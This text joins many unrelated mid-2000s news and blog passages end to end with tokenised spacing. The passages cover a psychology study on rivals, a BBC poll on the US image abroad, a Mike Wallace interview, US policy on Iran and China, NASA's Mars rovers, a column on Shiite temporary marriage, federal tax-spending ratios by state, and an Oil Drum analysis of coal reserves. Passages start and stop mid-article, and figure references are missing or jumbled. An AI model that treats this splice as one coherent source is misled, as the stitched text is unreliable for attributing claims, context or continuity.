On the other hand , fixating on attractive people of the same sex as rivals could contribute to feelings of insecurity .
Maner found that men prone to jealousy kept a close eye on attractive potential rivals .
“ When it comes to concerns about infidelity , men are very attentive to highly attractive guys because presumably their wives or girlfriends may be too , ” he said .
Maner 's experiments , which flashed pictures of attractive men and women and average - looking men and women in front of participants and measured the time it took to shift their attention away from the image , surprisingly showed little difference between the sexes .
“ Women paid just as much attention to men as men did to women , ” Maner said .
The study is detailed in the September issue of the Journal of Personality and Social Psychology .
The US knows how to use hard power to back up its interests
The Bush administration 's toppling of Saddam Hussein has had several profound and unintended consequences .
One has been the way in which the destruction of both the Taleban regime in Afghanistan , and of Iraq 's military machine , have opened the way for the rise of Iran as a major regional player .
Another crucial but less tangible problem - as this opinion poll commissioned by the BBC World Service indicates - is that the US 's image around the world is being seriously damaged by the chaos in Iraq .
And if that was not bad enough , it suggests that America 's image problems are only getting worse .
The global image of the US has significantly deteriorated over the past 12 months , as the chaos in Iraq has deepened .
And in 18 of the countries that were involved in previous polls , the slide in America 's standing has steepened .
Anti-Americanism rising
Overall , this new opinion poll sampled the views of 26,000 people in 25 countries .
Three in every four of those questioned disapproved of how the US government was dealing with the crisis in Iraq .
The poll did not just deal with Iraq .
It also asked questions about the US handling of Guantanamo detainees ; the Israel - Hezbollah war ; Iran 's nuclear programme ; global warming ; and North Korea 's nuclear programme .
In every case , a majority of those questioned disapproved of America 's handling of the issue concerned .
Poll findings in more detail
At-a-glance
This poll underscores conclusions drawn from several other surveys - that anti-Americanism is on the rise , and the more the US flexes its hard power - the more it deploys troops abroad or talks tough diplomatically - the more it seems to weaken its ability to influence the world .
Maybe Washington will bounce back .
America 's image improved markedly in the post - Vietnam era .
But then there was still the Cold War to keep America 's allies on - side .
What is striking in this survey is how negatively the US is seen across a range of diverse countries .
Indeed the same policies are , in many cases , even unpopular in the US itself .
This , then , raises an obvious question .
Is it simply the Bush administration 's foreign policy or the whole image of America that is unpopular ?
Comparable surveys suggest that there is still strong support around the world for the values enshrined in US society .
But it looks as though America itself is seen to be living up to those values less and less .
As a result , America 's soft power - its ability to influence people in other countries by the force of example and by the perceived legitimacy of its policies - is weakening .
And in a turbulent , globalising world , where the US - rightly or wrongly - is associated by many with the disruptive effects of globalisation , soft power matters more than ever .
It is a resource that once squandered is very difficult to build - up again .
Complex issues
At root is the problem of legitimacy .
Iraq may have dented the utility of America 's military machine .
But the US remains the world 's only superpower in an international system that shows few of the familiar landmarks we have come to associate with the past 50 - or - so years of international diplomacy .

Asking , as this survey does , about the participants ' opinion of the US government 's handling of , say , Iran 's nuclear programme , provokes strong levels of disapproval .
But what does this really mean ?
Is there any constituency at all for getting tough with Iran ?
How far is Iran 's nuclear programme perceived as being a problem at all ?
Other opinion polls , asking different questions , suggest that ordinary people in many of America 's allies are indeed worried by the suggestion that Iran might acquire nuclear weapons .
It is the Bush administration 's handling of the issue that is reflected in this BBC poll ; not the policy options themselves .
These are complex .
They depend upon often unavailable intelligence and uncertain assessments of what the Iranian authorities are really about .
Opinion polls are not terribly useful then in charting specific policy options .
The US undoubtedly has an " image - problem " , and there are worrying signs that this is having an impact upon the administration 's ability to get the policy outcomes that it wants .
One of the wisest writers on these issues is Joseph S Nye , now Dean of the John F Kennedy School of Government at Harvard University .
He is in many ways " Mr Soft Power " , having written and theorised about the phenomenon for many years .
He has long - argued that Americans need to better understand how their policies appear to others .
" To communicate effectively , " he has written , " Americans must first learn to listen . "
This opinion poll , then , represents a powerful argument for those seeking to make the case that Washington should listen more and try to win over its friends as much by persuasion and force of example as by firm actions and tough rhetoric .
Mike Wallace and his hard - hitting brand of journalism have been synonymous with ' ' 60 Minutes " since CBS introduced the program in 1968 .
Now 87 years old , Wallace , who has interviewed everyone from Malcolm X to Johnny Carson , has written his second memoir .
Wallace was in Brookline , his hometown , recently to talk about '' Between You and Me . "
He managed to squeeze in trips to his old house on Osborne Road and to his elementary school , Edward Devotion , before answering a few questions .
Q. President George W. Bush has declined to be interviewed by you .
What would you ask him if you had the chance ?
A . What in the world prepared you to be the commander in chief of the largest superpower in the world ?
In your background , Mr. President , you apparently were incurious .
You did n't want to travel .
You knew very little about the military .
. . .
The governor of Texas does n't have the kind of power that some governors have .
. . .
Why do you think they nominated you ?
. . .
Do you think that has anything to do with the fact that the country is so [ expletive ] up ?
Q . What do you think about American journalism today , with its plagiarism scandals , layoffs , and conglomerate ownership influencing newsrooms ?
A . It 's different , is n't it ?
The days of Walter Cronkite and Huntley and Brinkley are gone .
People still do watch , but it does n't have the clout that it used to have .
I do n't know what 's going to happen or if there will be an evening news 10 years from now .
It 's a very expensive operation to keep up .
Q. How do you relate to contemporary media ?
Do you read blogs , play video games , consult your Blackberry ?
A. No .
I feel as though I 'm out of it .
I chide myself .
But I 'm not doing that much day - to - day coverage now .
Q. What do you think of Fox News ?
A. Well , my son [ Chris Wallace ] works for them .
. . . [ Fox News chairman and CEO ] Roger Ailes is a man I admire very much .
He understood there was a market that was not being served .
He was right .
Q. Given the competition today , how do you think ' ' 60 Minutes " is faring ?
A . In the '70s , '80s , and '90s , we were always in the top 10 . . . .
Now , it 's different .
But I think we 've held onto our standards remarkably well , no thanks to me because I do n't do the kinds of stuff I used to .
Q . Of all the people you have interviewed , whom do you admire most ?
A. Martin Luther King . . . .
Despite the gratitude he felt for what Lyndon Johnson did about relations between the races , Martin had the guts during the Vietnam War to say this is the wrong war , the wrong time , the wrong place .
Q . You have a reputation for being a bulldog reporter .
Any regrets about how you 've treated people ?
A. I determined when I started back in 1956 . . . there 's no such thing as an indiscreet question .
Q . You said recently that you thought Dan Rather should have resigned after his producers lost their jobs over the infamous story last year about President Bush 's military service record .
A . When everybody who helps you put together a piece like that gets fired , do n't you think it ought to cross your mind ?
Q . Why did n't you resign from ABC in 1957 , when the network president apologized on air for an interview you did with another journalist who said that then - Senator John F. Kennedy was not the author of the Pulitzer Prize - winning '' Profiles in Courage " ?
A . You know something ?
It would n't have caused a stir at all if I had .
No one would 've paid any attention .
I was no one .
Q. How long do you plan to keep working ?
A. Until my toes turn up .
Q. You attended the same elementary school as John F. Kennedy and Robert Kraft .
What do you remember about those days ?
A. I graduated from Brookline High in 1935 .
I used to come [ into Boston ] and ride the swan boats .
My dad started a grocery business in Boston in the late teens .
It was called Frank Wallace & Sons. Everybody loved Frank .
He was really warm .
My mother , Zina , was a homemaker and rather humorless .
Q . In your book , you describe meeting Kraft a few years ago when he told you that your alma mater had hung pictures of its three famous graduates .
Kraft 's picture was supposed to be on top , because he had the best grades .
Today you discovered there are n't any pictures .
A. Can you imagine ?
I felt bad when I got to the school and said , ' Where are the pictures ? '
I was told by the headmaster , ' Do n't be mean to Mr. Kraft . '
You 'd better believe I 'm going to call Kraft .

Could China bring Iran around in a similar way ?
The two confrontations are different in myriad ways , but there are some signs that the answers could be yes .
White House officials , for example , note that China , which had remained in the background at the United Nations when the United States pressed for more pressure on Iran , has now signed on to two rounds of ( mild ) sanctions .
They say it could support a ( tougher ) third round if reports expected this fall suggest that Iran is breaking its commitments not to pursue nuclear weapons .
Experts also say China needs Iranian gas and oil for its economic growth — and while this has made it skittish about imposing tough sanctions , it also makes China eager to avert a war in the Persian Gulf that would disrupt energy supplies .
Still , it would be wishful thinking to call China an ally or even a partner , given its historical and political divisions with the United States .
China has proved unwilling to go along with much of what the Bush administration has asked of it , especially when it comes to punishing authoritarian regimes .
On that score , China ’s one - party rulers have always been cautious , calling such measures interference in the internal affairs of others .
Given that history , there are reasons to think that Chinese cooperation on Iran could have its limits .
The Korean Peninsula is on China ’s border , as is Myanmar , and that alone could explain China ’s interest in reducing tensions there .
For the United States , fear of Iran ’s nuclear capability is linked to fear of Iran ’s ties to groups like Hezbollah and Hamas , and to its growing influence in Iraq ; those are worries whose urgency the Chinese do not seem to share .
The dividing lines are there , between each instantiation of " I " , even if I can never quite get a glimpse of them .
If I squint just so , fast - forwarding through the events of a past self , I do n't quite reach a boundary so much as reach a gap .
After which another " I " instantiates itself .
The dividing line is there ; I 'm sure of it .
But it only seems blurrily visible when I do n't focus on it .
As soon as my eye approaches , it disapparates into the ether .
One of the greatest joys I 've personally experienced is that feeling you get when you genuinely change your mind .
It 's especially rewarding when you can feel the dominoes falling as each step in a logical sequence causes you to change your mind on increasingly complex lemmas after a basic premise 's truth value switches .
I recently read a four year old article by Eliezer Yudkowsky on why Many Worlds survives Occam 's razor .
The argument was persuasive enough to cause me to change my mind on a stance I 've held for nearly two decades .
I subscribe to a lot of podcasts .
I use podcasts to keep up with the news , learn more about the world , and expand my mind generally .
As such , I 've sampled and stopped listening to more podcasts than most people have even heard of .
Foreign policy expert says Bush has ruled out first - strike on Iran ; Worries about ' accidental ' conflict John Byrne
Published : Wednesday September 19 , 2007
Print This Email This Tells RAW he does n't believe Bush is in the ' Cheney gang ' yet President Bush is not going to bomb Iran -- unless an " accidental " incident forces his hand , according to well - respected foreign policy moderate Steve Clemons , who laid out his case in Wednesday 's Salon article , " Why Bush Wo n't Attack Iran . "
Clemons , director of the American Strategy Program at New America Foundation and publisher of The Washington Note , says Bush has deviated from a Cheney - laid track to launch a first - strike on Iran , citing , as examples , frustrations that the vice president 's aides are airing , a conversation with a journalist who sat in on a December 2006 strategy meeting , and private conversations with high - level foreign policy players .
In a telephone conversation with RAW STORY Wednesday , Clemons emphasized that he was n't arguing that there would n't be an American conflict with Iran .
Rather , he believes that Bush has opted not to strike Iran in a first - strike scenario .
His gravest concern , he said , was that the US might seize on an accidental incident -- such as a collision between a US and Iranian ship or a border skirmish between Iraq and Iran -- as a causis belli .
" A mistake in the Gulf where ships collide or US soldiers are attacked or Israel fires a low - level cruise missile attack against Natanz or there 's a border skirmish between Iraq and Iran that results in the death of a high - ranking military or diplomatic official  any of these could spark a conflict , " he said .
Of the indications that Bush has thus far tabled a preemptive strike , Clemons believes " the most significant is that the Cheney wing feels that Bush is not on their side and they 're frustrated with that .
The fact that the Cheney wing feels they need to tie Bush 's hands , ' end run ' the president and remove the ' diplomatic course ' from the field of options in front of the President is an indication that Bush hasnt decided to bomb . "
Clemons cites a report by Time Magazine journalist and commentator Joe Klein , which spoke of a meeting Klein sat in on in December 2006 .
Then Bush asked about the possibility of a successful attack on Iran 's nuclear capability .
He was told that the U.S. could launch a devastating air attack on Iran 's government and military , wiping out the Iranian air force , the command and control structure and some of the more obvious nuclear facilities .
But the Chiefs were -- once again -- unanimously opposed to taking that course of action .
Why ?
Because our intelligence inside Iran is very sketchy .
There was no way to be sure that we could take out all of Iran 's nuclear facilities .
Furthermore , the Chiefs warned , the Iranian response in Iraq and , quite possibly , in terrorist attacks on the U.S. could be devastating .
Bush apparently took this advice to heart and went to Plan B -- a covert destabilization campaign reported earlier this week by ABC News .
" I think a classic war buildup that we had with Iraq is not possible for Iran , " he continued .
" There are too many inter-agency blocks . "
" I 'm not saying there wo n't be any war but nothing in Bushs posture suggests he 's really with the Cheney gang yet .
But I do worry about the Cheney gang and the [ Iran Revolutionary Guard Corps ] / Ahmadinejad crowd in Iran trying to precipitate a spark that produces a very fast escalation that circumvents most of Bushs national security decisionmaking structure -- and that kind of war is something we should worry about .
That 's what I think could happen .
" An ' accidental war ' would escalate quickly and ' end run , ' as Cheney aide [ David ] Wurmser put[s ] it , the president 's diplomatic , intelligence and military decision - making apparatus , " Clemons wrote in his Salon editorial .
" It would most likely be triggered by one or both of the two people who would see their political fortunes rise through a new conflict -- Cheney and Iranian President Mahmoud Ahmadinejad . "
Increased CIA activity on the ground RAW STORY has reported on alleged attempts by the Office of the Vice President to provoke Iran into a first strike situation as a pre-text for US strikes .
Managing Editor Larisa Alexandrovna reported in August on alleged new activities by the Central Intelligence Agency , seen by some to suggest US escalating its attempts to provoke Iran .
A senior intelligence official told RAW STORY that the CIA had stepped up operations in the region , shifting their Iran focus to other approaches in preference to the black propaganda that Raw Story has already reported on .
The source would not elaborate on what these other approaches are .
At the time , CIA spokesman Paul Gimigliano would neither confirm nor deny that other operations were taking place .
 The CIA does not , as a matter of course , comment on allegations involving clandestine operations , despite the large amount of misinformation that circulates publicly on the subject , " Gimigliano said .
RAW STORY revealed in June that Iran was being targeted by CIA activities promoting a pro-democracy  message and that the agency was supporting overt pro-democracy  groups .
Clemons first revealed a battle between Cheney aides and those at the State and Defense Department in May .
Supporting a pre-emptive strike , he said , was Cheney 's office ; opposing was Secretary of State Condoleezza Rice , Defense Secretary Robert Gates , White House chief of staff Josh Bolten and Director of National Intelligence Mike McConnell .
" The thinking on Cheney 's team is to collude with Israel , nudging Israel at some key moment in the ongoing standoff between Iran 's nuclear activities and international frustration over this to mount a small - scale conventional strike against Natanz using cruise missiles ( i.e. , not ballistic missiles ) , " he wrote .
Mars Rovers Survive Dust Storms , Ready for Next Objectives

PASADENA , Calif . -
Two months after sky - darkening dust from severe storms nearly killed NASA 's Mars exploration rovers , the solar powered robots are awake and ready to continue their mission .
Opportunity 's planned descent into the giant Victoria Crater was delayed , but now the rover is preparing to drive into the 800 - meter - diameter crater ( half - mile - diameter ) as early as Sept. 11 . Spirit , Opportunity 's rover twin , also survived the global dust storms .
The rovers are 43 months into missions originally planned to last three months .
On Sept. 5 , Spirit climbed onto its long - term destination called Home Plate , a plateau of layered bedrock bearing clues to an explosive mixture of lava and water .
" These rovers are tough .
They faced dusty winds , power starvation and other challenges -- and survived .
Now they are back to doing groundbreaking field work on Mars .
These spacecraft are amazing , " said Alan Stern , associate administrator of NASA 's Science Mission Directorate , Washington .
Victoria Crater contains an exposed layer of bright rocks that may preserve evidence of interaction between the Martian atmosphere and surface from millions of years ago , when the atmosphere might have been different from today's .
Victoria is the biggest crater Opportunity has visited .
Martian dust storms in July blocked so much sunlight that researchers grew concerned the rovers ' daily energy supplies could plunge too low for survival .
Engineers at NASA 's Jet Propulsion Laboratory , Pasadena , Calif. , put Opportunity onto a very low - energy regimen of no movement , few observations and reduced communication with Earth .
Skies above both rovers remain dusty but have been clearing gradually since early August .
Dust from the sky has been falling onto both rovers ' solar panels , impeding their ability to collect energy from the sun .
However , beneficial wind gusts removed some of the new buildup from Opportunity almost as soon as it accumulated .
Opportunity drove to the lip of Victoria Crater in late August and examined possible entry routes .
This week , Opportunity has been driving about 40 meters ( about 130 feet ) toward its planned entry point .
The route will provide better access to a top priority target inside the crater : a bright band of rocks about 12 meters ( about 40 feet ) from the rim .
" We chose a point that gives us a straight path down , instead of driving cross - slope from our current location , " said Paolo Bellutta , a JPL rover driver plotting the route .
" The rock surface on which Opportunity will be driving will provide good traction and control of its path into the crater .
" For its first foray into the crater , Opportunity will drive just far enough to get all six wheels in ; it will then back out and assess slippage on the inner slope .
" Opportunity might be ready for that first ' toe dip ' into the crater as early as next week , " said JPL's John Callas , rover project manager .
" In addition to the drives to get to the entry point , we still need to conduct checkouts of two of Opportunity 's instruments before sending the rover into the crater .
"
The rover team plans to assess if dust has impaired use of the microscopic imager .
If that tool is working , the team will use it to observe whether a scanning mirror for the miniature thermal emission spectrometer ( Mini - TES ) can function accurately .
This mirror is high on the rover 's camera mast .
It reflects infrared light from the landscape to the spectrometer at the base of the mast , and it also can be positioned to close the hole in the mast as protection from dust .
The last time the spectrometer was used , some aspects of the data suggested the instrument may have been viewing the inside of the mast instead of the Martian landscape .
"
If the dust cover or mirror is no longer moving properly , we may have lost the ability to use that instrument on Opportunity , " said Steve Squyres of Cornell University , Ithaca , N.Y. , principal investigator for the rovers ' science instruments .
" It would be the first permanent loss of an instrument on either rover .
But we 'll see .
" The instrument already has provided extensive valuable information about rocks and soils in the Meridiani region where Opportunity works .
" Mini -TES has told us a lot about the rocks and soils at Meridiani , but we 've learned that the differences among Meridiani rocks are often too subtle for it to distinguish , " Squyres said .
" The same instrument on Spirit , at Gusev Crater , has a much more crucial role for us at this point in the mission because there is such diversity at Gusev . "
Researchers will rely heavily on a different type of instrument , Opportunity 's alpha particle X - ray spectrometer , for analysis of rocks at the bright - band target layer in the crater .

This is the third installment of our weekly column entitled Ask a Shiite .
Our resident Shiite and United Arab Emirates citizen will be fielding questions of a philosophical , physical , and political nature in regards to Shiite Islamic belief and Middle East perception .
Interested in asking a question ?
Send an email to alec .
Question : Can you talk about sex and society in the United Arab Emirates and in Islamic culture in general ?
What is temporary marriage and how does it function in Islamic law and faith ?
Is there premarital sex and can you talk about the relationship between sex and religion for Muslims ?
Answer : Temporary Marriage is a practice allowed for Muslims when they need to engage with someone from the opposite sex for multiple reasons but for a fixed amount of time and a less ‘ connected ’ relation .
Temp Marriage can be done for any amount of time .
In the eyes of God you are lawful to each other .
Once the period of the marriage expires , the couple are free to go and are ‘ divorced ’ automatically .
But after that period the girl or woman has to wait for four monthly menstruation cycles before contracting another marriage .
This prevents many problems .
But in this time , if they want , the couple can marry each other again .
There are a few other conditions and rules which need to be followed in Mutah and they prevent corruption .
Mutah ( Temp Marriage ) is not done only for sexual pleasure but for many other reasons .
Technically speaking a boy or girl who have reached physical maturity can engage in Mutah .
Physical maturity is defined with particular
rulings .
In many countries like Iran , I have heard , Mutah is quite common but I have personally not come across people engaging in Mutah .
To engage in Mutah , the girl says a specific sentence in Arabic which basically means that she is engaging herself in Marriage for the agreed time and Dower .
Then immediately the boy replies Accepted .
These are the only formalities required and the couple are engaged together .
For this declaration , no witnesses are required but there is no problem if there are .
The dower is a small present to the wife from the husband .
Mutah is you could say a private thing and does not have anything to do with the UAE ’s law .
Otherwise it is done in the same way around the world .
Talking about sex is absolutely allowed in the UAE without any , as far as I know , law which prevents it .
If someone has a problem with you then matters get serious otherwise if you talk with your friends in a responsible way then you are good to go .
In Islam also discussing sex is allowed provided you do not have a bad intention or you are not aroused leading to a major sin .
Sex is discussed for educational purposes in fact our Infallible Imams have given us instructions on mating which are , according to science today , correct and recommended .
I personally have not come across people engaging in temporary marriage .
It is allowed , practiced but people only use it as a last resort .
They try to control themselves and given the right advice at the right time , people manage to pull off their teenage and young adult life without mating .
There are many ways of controlling oneself and a person just needs to manage his lust properly .
The reward for control over ones mind , temptations and emotions , not just in lust , is more than that of defending ourselves by war .
War comes under Jihad Asghar ( Lesser Struggle ) and this control comes under Jihad Akbar ( Greater Struggle ) .
Premarital sex is not allowed in Islam as it is a form of fornication and comes under a Major Sin .
I do n’t understand why someone would want to have premarital sex when one can engage in temporary marriage .
Of course , as said above , we can talk about the relation between sex and religion .
Your perceptions towards Muslims seem to be one where Muslims are totally cut off from sex and that sex is a sin .
Sex is in fact highly encouraged and given that you have the right intentions , it comes under worship of God .
Sex gets rid of our sins very quickly .
This however has to be done under the Sharia rules which really help the society in the long run .
They might seem harsh but this opinion should not remain when one studies their philosophy , reasoning and logic .

Why some states get less from Uncle Sam
A Tax Foundation report measures how much each state gets in federal spending compared to what it pays in federal taxes .
NEW YORK ( CNNMoney.com ) �
Do you live in a " donor " state ?
Residents of New Jersey do .
For every $ 1 they pay in federal taxes , they get back just 55 cents in federal spending per capita .
LEAST BANG FOR FEDERAL BUCK
State� For every $ 1 to Uncle Sam , the state got back : � New Jersey � 55 cents � Connecticut� 66 cents � New Hampshire � 67 cents � Minnesota� 69 cents � Illinois and Nevada� 73 cents � � � MOST BANG FOR FEDERAL BUCK
State� For every $ 1 to Uncle Sam , the state got back : � New Mexico� $ 2.00 � Alaska� $ 1.87 � West Virginia� $ 1.83 � Mississippi� $ 1.77 � North Dakota� $ 1.73 � � �
Residents of New Mexico , on the other hand , double their money -- for every $ 1 , they get back $ 2 .
The Tax Foundation , a nonprofit policy research group that advocates for a flat tax , calculated the discrepancies between states in their bang - for - the - federal - buck using data from the Census Bureau for fiscal year 2004 .
The categories of federal tax collected from each state include federal income tax ( both individual and corporate ) , social insurance tax , excise taxes , estate and gift taxes and customs duties .
On the federal spending side , researchers considered what each state received in terms of retirement and disability benefits , grants to state and local governments , other direct payments , salaries and wages paid to federal employees in a state , and money from federal government contracts to companies in a state .
The Foundation did make some key assumptions , however .
For example , since the federal government spends more than it takes in , the Tax Foundation assumed the deficit reflects future tax collections and counted all of those collections as if they were made in fiscal year 2004 .
Also , they spread out across all states the burden of certain federal excise taxes that are disproportionately paid by a few states .
For example , a lot of the corporate excise taxes on bourbon come from Kentucky , but bourbon is consumed across the country and often corporate taxes are passed along to consumers in the price of a good and to shareholders in the form of lower profits .
While a state 's politicians can have sway over discretionary federal spending , a lot of federal spending is not discretionary , said Tax Foundation economist Curtis Dubay .
For example , the federal money spent on a state for retirement and disability benefits will be determined by the number of residents eligible for those benefits .
Another factor influencing how much a state gets from Uncle Sam is the level of income generated by a state .
What 's common among states like New Jersey with the least favorable tax - to - spending ratios is that they tend to be among the higher income states .
But since the federal tax code does n't recognize cost - of - living differences and salaries tend to be higher in pricey places , residents in high - income states tend to pay more in federal taxes because they are taxed at higher rates than if they made a lower income in a less expensive state .

At The Oil Drum , there has been much discussion of the modeling of future oil production and the reliability of reserve data .
It is also understood that burning fossil hydrocarbon fuels increases the CO2 concentration in the atmosphere , and that this is likely to affect our climate .
What about coal ?
Can we figure out how much coal is likely to be produced , and how quickly the coal reserves will be exhausted ?
How reliable are coal reserve numbers ?
What can our models for coal and hydrocarbon production tell us about atmospheric CO2 concentrations ?
About climate ?
It turns out that we can give answers to all of these questions , using the same Hubbert linearizations and normal curve fits that we use for oil .
I appreciate this opportunity to contribute a post to The Oil Drum .
This site is the most important forum for the discussion of oil production , because of the vigor and depth of the debate .
I would like to offer some calculations for coal production and climate change .
I hope you that find coal as interesting as oil .
Coal is the most important fossil fuel for generating electricity , and it is a major source of atmospheric CO2 .
Oil reserves are rightly viewed skeptically at The Oil Drum , in large part because of fraud by the OPEC countries .
Coal reserves are compiled by the national geological surveys , and unlike oil reserves , they are honest .
However , recently Dr. Werner Zittel and Jorg Schindler and their Energy Watch Group have written an important paper “ Coal : Resources and Future Production ” that shows that there are major problems with the reliability of coal reserves , and indicates that the reserves may be too high .
Coal is different from oil , and much of the intuition that we may have developed about oil from nights pondering TOD posts is wrong for coal .
Finding oil is hard , and we have not found it all yet .
In contrast , people knew where the coal was a century ago .
Once oil is found , it is likely to be produced quickly , so much so that discovery history is routinely used to predict future production .
On the other hand , there are large coal fields that are almost undeveloped .
As an example , Montana has larger coal reserves than Europe , Africa , or South America , but it is producing less than 0.1 % of that coal each year .
Our estimate of future coal production depends a lot on whether we think that the people of Montana will get into serious coal production .
Finally , in contrast to the situation for oil , the world market for coal is only partially developed .
Most coal is consumed in the country it is produced in , and there are large differences in prices , even in the same country .
For this reason , we will analyze production on a regional basis .
I will apply the techniques to coal that are routinely used here for oil , and consider the consequences for future climate change .
People who are interested in more details can get the spreadsheets with the raw data at my web site , with lots of additional figures and source links .
The authoritative source of information on climate change is the UN Intergovernmental Panel on Climate Change ( IPCC ) , which is releasing its 4th Assessment Report this year .
This is a mammoth undertaking , with more than 1,000 authors and more then 1,000 reviewers .
The fossil - fuel contribution to climate change is considered in terms of 40 scenarios , each considered to be equally valid .
In the assessment modeling , the factors for future fossil - fuel production are primarily population , policy , and GDP , and limitations in fossil - fuel supplies are not considered critically .
Parts of the scenarios would strike most readers at The Oil Drum as preposterous .
For example , in 17 of the scenarios , world oil production is higher in 2100 than it was in 2000 .
Even OPEC oil ministers do not make that claim .
Thinking about climate change also requires adjusting to the long time scales .
At the Oil Drum , there is much discussion of whether the Ghawar field will decline next year .
However , from the point of view of a temperature peak in the next century , it matters little whether we burn a ton of coal now or 50 years from now .
This means that a policy that results in a ton of coal being consumed next year instead of this year does little good .
Because of the long time horizon , we will use cumulative plots , which smooth out the year - to - year fluctuations .
To start with a plot that you will probably recognize , let us consider the cumulative production for US crude oil , courtesy of the amazing data gnomes at the EIA .
This is a terrific series that starts all the way back in 1859 .
On the same graph , I have a shown a normal curve , fit to the data .
This is the bell - shaped curve from statistics class , plotted in cumulative form .
The fit is done just by clicking the Solver button in Microsoft Excel , and it is absolutely perfect .
I used 3 - point symbols , which are the smallest ones I could see , and the symbols bury the fitted curve for over 100 years .
We will see that we can also use cumulative normal fits for coal production .
Figure 1 . Cumulative US crude - oil production from 1859 , plotted from 1900 on , together with a normal curve that is the least mean square fit ( ultimate 225 Gb , 10 % year 1939 , 90 % year 2011 ) .
The projected remaining production is 31 billion barrels .
Given current production levels of 2 billion barrels per year , the prognosis for US oil production is grim .
Often we do not have enough data to fit for remaining production this way .
In these situations , I will use a Hubbert linearization to estimate the remaining production , like we often do for oil .
Hubbert introduced this approach for modeling oil production in " Techniques of Prediction as Applied to the Production of Oil and Gas , " in Saul I. Gass , ed. , Oil and Gas Supply Modeling , pp. 16-141 .
National Bureau of Standards special publication 631 .
Washington : National Bureau of Standards , 1982 .
This is a great paper .
It is difficult to find , but you can download it here ( 15 MB file ) .
Figure 2 shows a Hubbert linearization for world hydrocarbon production .
The trend line is for 3.2 trillion barrels of oil equivalent ( Tboe ) remaining .
We will use this number for our simulation of future atmospheric CO2 concentrations and temperature rise .
This is 20 % larger than the reserves given by the German resources agency BGR , 2.7Tboe .
The BGR includes 500 Gboe for unconventional sources .
In contrast , the IPCC assumes that 11 - 15 Tboe is available for production for its climate - change scenarios .

Open symbols 1960 - 1992 , closed symbols 1993 - 2006 .
For coal , we start with the United Kingdom .
The British production cycle is nearly complete , and it is substantial , equivalent in energy content to the cumulative Saudi oil production .
There are excellent production records back to 1854 , and there is even a good cumulative production figure for 1853 .
The Victorians were outstanding geologists , and there are good reserve estimates back to 1864 .
British coal even had a Hubbert .
His name was William Stanley Jevons , and he was an economist .
In 1865 , he wrote a book , The Coal Question ; An Inquiry Concerning the Progress of the Nation , and the Probable Exhaustion of our Coal - Mines , which should be read by anyone who is interested in coal or oil .
Jevons wrote that even though the reserves - to - production ( R/P ) ratio was around 1,000 years , exponential growth would exhaust British coal in the 20th century .
Jevons was right .
In his time , there were more than 3,000 coal mines .
Now the British are down to six major underground mines , with the last Welsh mine , the Tower Colliery , due to finish off its last seam next year .
Figure 3 shows a Hubbert linearization for British coal .
There is a good trend line , and the very first point in 1854 is near the line .
We will see that the quality of the trend is in contrast to the reserves , which badly over - estimate remaining production throughout .
Figure 3 . Hubbert linearization for British coal from 1854 to 2006 , with a trend line for an ultimate of 27 Gt .
The peak production was 292Mt in 1913 .
The production for 2006 was only 19 Mt .
The normal fit , shown in Figure 4 , is more complicated than our normal fit for US oil .
There are two pieces , one for production before the Second World War , and one afterwards with a higher ultimate .
Why did this happen ?
It could simply be that economic activity increased after the war .
Another possibility is technical change ; strip mining started in Britain during the war .
Yet another possibility is that it is a result of the coal mines being nationalized in 1947 .
This created strong political incentives to support coal production .
I was an undergraduate student in England in the early 70’s when the coal miners brought down the Heath government .
Even though the mines are privately owned now , the mining companies still receive government grants to help open up new seams .
Figure 4 . Cumulative normal fits for British coal .
The pre-war fit gives an ultimate of 25.6 Gt , with the 50 % year in 1920 .
The post - war fit gives an ultimate of 27.2 Gt , with the 50 % year in 1927 .
Now that British coal production is essentially done , we can compare historical reserves with the actual remaining production , which we now know .
Jevons discusses a reserve calculation done in 1864 by Edward Hull .
Hull made allowances for coal left in the pillars that stabilize the mines against collapse , for bands of coal around the outside to keep out water , and for areas where the seams became thin .
Figure 5 shows reserve estimates made at different times , compared with a plot of remaining production .
Notice that the reserves are way too high , and that they collapse near the end of the production cycle .
This is a major problem if you want to use reserves to predict production .
Reserves should be an indicator of future production .
Unfortunately it appears to be the other way around .
Figure 5 . Reserves compared with remaining production for British coal .
Note that this is a logarithmic plot , so the differences are larger than they may appear .
The reserves are taken from the World Energy Council series of reports .
These are hard to track down , but you can download them here ( 50 MB ) .
Now let us consider the reserve history with the traditional R/P ratio .
Figure 6 is a plot of the R/P ratio over time , beginning with Hull in 1864 .
The R/P ratio started at 900 years , and stayed above 500 years until a hundred years later .
However , the R/P ratio collapsed in the 70’s , dropping almost 749 years in 1973 to 90 years in 1984 .
In the end , only 30 % of Hull ’s reserves were eventually produced .
This underproduction is not an isolated error .
On my web site , there are plots for Pennsylvania anthracite and Virginia bituminous coal .
Pennsylvania anthracite has a single trend line with a single normal fit .
Virginia bituminous has pre-war and post - war fits , like British coal .
In each case , the remaining production was only 16 % of the early reserves .
And in other cases I have considered , where a clear trend exists , the remaining production is less than reserves .
We will consider the reserves to be an upper limit on remaining production .
Figure 6 . Reserves - to - production ratio for British coal .
The R/P ratio has not been a good indicator of future coal production .
I approach the problem of estimating future world coal production by breaking the world up into eight regions , and estimating considering production in each separately .
The regions are Australia , South Asia , East Asia , Former Soviet Union , Africa , Europe , South America and North America .
North America is further divided into Eastern US , Western US without Montana , Montana , Canada , and Mexico .
We look for trends , and if we find them , we will use them to estimate remaining production .
If there are no trends , we will use reserves .
Because of space limitations , I show plots for only two regions here , but the rest are on my site , along with the data sources .
Figure 8 shows a Hubbert linearization for coal east of the Mississippi .
The production data come from an outstanding USGS collection developed by Robert Milici , which gives production data by state back to 1800 .
Figure 7 .
Hubert linearization through 2005 for US coal east of Mississippi , without Pennsylvania anthracite .
Early closed symbols 1900 - 1940 , open symbols 1941 - 1945 , later closed symbols 1946 - 2005 .
There is a pre-war trend for an ultimate production of 20 Gt , and a post - war trend for 40 Gt remaining .
The reserves are 96 Gt , reported by the
EIA .
Figure 8 shows the Hubbert linearization for China .
China accounts for 40 % of the world ’s coal production and is producing more than twice as much coal as the US .
For 40 years , there has been a trend for 70 Gt remaining , but in the last three years , production has gone through the roof .
There may be a move to a new trend line underway .
It is also possible that production will come back to the original trend line .
During the Great Leap Forward from 1958 to 1960 , reported production soared for a few years , but returned afterwards to previous rates .

Open symbols 1918 - 1961 , closed symbols 1962 - 2006 .
The trend for 70 Gt remaining compares with reserves of 189 Gt , reported by the Chinese Ministry of Land and Resources .
I am grateful to Sandro Schmidt of the BGR for sending me this reserve information .
The table below shows the results for the different regions .
For South Asia , and Central and South America , there has been exponential growth in recent years , so there is no trend .
